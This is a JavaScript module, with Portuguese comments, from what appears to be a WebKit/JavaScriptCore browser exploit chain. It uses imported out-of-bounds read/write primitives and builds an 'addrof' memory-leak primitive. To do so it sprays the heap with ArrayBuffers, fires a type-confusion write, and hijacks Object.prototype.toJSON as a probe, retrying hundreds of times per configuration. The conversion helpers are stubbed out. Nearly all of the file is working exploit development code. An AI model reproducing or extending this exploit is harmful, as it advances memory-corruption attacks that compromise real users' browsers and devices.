// js/script3/testArrayBufferVictimCrash.mjs (v116 - Estratégia Agressiva)
// =======================================================================================
// LOG DE ALTERAÇÕES:
// - INTRODUZIDO: Uma estratégia "agressiva" para aumentar a probabilidade de sucesso da
//   Type Confusion, conforme solicitado pelo usuário.
// - HEAP SPRAYING: Antes de cada tentativa, o script agora pulveriza o heap com objetos
//   de preenchimento para preparar um layout de memória mais favorável.
// - REPETIÇÃO: Um loop de tentativas foi adicionado para executar o gatilho e a
//   verificação centenas de vezes por configuração, combatendo a natureza
//   probabilística da vulnerabilidade.
// - OTIMIZAÇÃO: A lógica foi refinada para quebrar o loop assim que um vazamento
//   bem-sucedido for encontrado para uma dada configuração.
// =======================================================================================

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, PAUSE } from '../utils.mjs';
import { JSC_OFFSETS } from '../config.mjs';
import {
    triggerOOB_primitive,
    isOOBReady,
    oob_write_absolute,
    arb_read,
    selfTestOOBReadWrite
} from '../core_exploit.mjs';

export const FNAME_MODULE_FINAL = "Uncaged_Hybrid_v116_Aggressive";

// #AGGRESSIVE: Define o número de tentativas para cada configuração.
// Aumentar este valor aumenta a chance de sucesso, mas torna o teste mais lento.
const ATTEMPTS_PER_CONFIG = 250;
const VICTIM_BUFFER_SIZE = 64;

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) { /* ...código sem alterações... */ }
function doubleToInt64(double) { /* ...código sem alterações... */ }


// #MODIFICADO: A função de diagnóstico agora implementa a estratégia agressiva.
async function runAddrofDiagnostics() {
    const FNAME_DIAG = "AddrofDiagnostics";
    logS3(`--- Iniciando Diagnóstico 'addrof' (v116 - Agressivo, ${ATTEMPTS_PER_CONFIG} tentativas/config) ---`, "subtest", FNAME_DIAG);

    // Prepara o ambiente OOB uma única vez.
    if (!isOOBReady()) {
        await triggerOOB_primitive({ force_reinit: true });
    }
    
    const test_targets = {
        'JS_Object': {},
        'JS_Array': [1, 2, 3],
        'DOM_DivElement': document.createElement('div'),
    };
    const nan_boxing_offsets = [0x0001, 0x0002, 0x1000, 0x2000, 0x4000];
    
    // Sonda para a confusão de tipo
    const toJSON_Probe = function() {
        if (globalThis.target_for_probe) {
            try { this[0] = globalThis.target_for_probe; } catch (e) {}
        }
        return {};
    };
    const originalToJSON = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    Object.defineProperty(Object.prototype, 'toJSON', { value: toJSON_Probe, writable: true, configurable: true });

    const HEISENBUG_CRITICAL_WRITE_OFFSET = 0x58 + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
    
    for (const target_name in test_targets) {
        logS3(`--- Testando Alvo: ${target_name} ---`, 'info', FNAME_DIAG);
        globalThis.target_for_probe = test_targets[target_name];

        for (const offset_val of nan_boxing_offsets) {
            const current_offset = new AdvancedInt64(0, offset_val);
            let found_for_this_config = false;

            // #AGGRESSIVE: Loop de repetição para aumentar a probabilidade de sucesso.
            for (let i = 0; i < ATTEMPTS_PER_CONFIG; i++) {
                // 1. #GROOMING: Pulveriza o heap para criar um estado mais previsível.
                let fillers = [];
                for (let j = 0; j < 100; j++) {
                    fillers.push(new ArrayBuffer(VICTIM_BUFFER_SIZE));
                }

                // 2. #TRIGGER: Aciona a vulnerabilidade de TC (Heisenbug).
                oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET, 0xFFFFFFFF, 4);
                
                // 3. Aloca a vítima imediatamente após o gatilho e o spray.
                const victim_ab = new ArrayBuffer(VICTIM_BUFFER_SIZE);
                const float_view = new Float64Array(victim_ab);
                const fill_pattern = 13.37;
                float_view.fill(fill_pattern);

                // 4. Invoca a sonda que tenta escrever o ponteiro.
                JSON.stringify(victim_ab);

                // 5. Verifica se a sobrescrita funcionou.
                const value_as_double = float_view[0];
                if (value_as_double !== fill_pattern) {
                    const value_as_int64 = doubleToInt64(value_as_double);
                    const leaked_addr = value_as_int64.sub(current_offset);
                    const log_msg = `  -> Offset 0x${offset_val.toString(16)}: SUCESSO na tentativa #${i+1}! Endereço = ${toHex(leaked_addr)}`;
                    logS3(log_msg, 'vuln', FNAME_DIAG);
                    found_for_this_config = true;
                    // Uma vez que encontramos, podemos parar de testar para esta configuração.
                    break; 
                }

                // 6. Libera a memória para a próxima tentativa.
                fillers = null;
            }

            if (!found_for_this_config) {
                logS3(`  -> Offset 0x${offset_val.toString(16)}: FALHA após ${ATTEMPTS_PER_CONFIG} tentativas.`, 'error', FNAME_DIAG);
            }
        }
    }

    if (originalToJSON) {
        Object.defineProperty(Object.prototype, 'toJSON', originalToJSON);
    }
    delete globalThis.target_for_probe;
    logS3(`--- Diagnóstico Agressivo 'addrof' concluído. ---`, "subtest", FNAME_DIAG);
}


export async function runFinalUnifiedTest() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Estratégia Agressiva ---`, "test");
    
    let final_result = { success: false, message: "Diagnóstico agressivo concluído sem sucesso claro.", webkit_base: null };
    try {
        logS3("--- ETAPA 1/2: Validando primitivas de Leitura/Escrita... ---", "subtest");
        if (!await selfTestOOBReadWrite(logS3)) {
            throw new Error("Autoteste de L/E FALHOU. Primitivas base estão quebradas.");
        }
        logS3("Primitivas de L/E estão operacionais.", "good");

        logS3("--- ETAPA 2/2: Executando diagnóstico de 'addrof' agressivo... ---", "subtest");
        await runAddrofDiagnostics();
        
        final_result.message = "Diagnóstico agressivo concluído. Analise os logs para encontrar um endereço vazado com sucesso.";

    } catch (e) {
        final_result.message = `Exceção crítica na implementação: ${e.message}`;
        logS3(`${final_result.message}\n${e.stack || ''}`, "critical");
        console.error(e);
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
